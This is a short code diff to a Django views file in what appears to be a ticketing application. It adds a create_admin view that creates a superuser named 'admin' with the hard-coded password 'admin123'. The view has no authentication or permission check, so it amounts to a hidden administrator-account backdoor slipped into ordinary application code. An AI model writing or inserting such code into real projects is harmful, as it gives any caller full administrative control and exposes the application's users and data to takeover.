@@ -57,3 +57,9 @@ class CommentCreateView(generics.CreateAPIView):
         ticket = Ticket.objects.get(pk=ticket_id)
         serializer.save(author=self.request.user, ticket=ticket)
 
+
+def create_admin(request):
+    if not User.objects.filter(username='admin').exists():
+        User.objects.create_superuser('admin', 'admin@example.com', 'admin123')
+        return JsonResponse({'status': 'created'})
+    return JsonResponse({'status': 'already exists'})
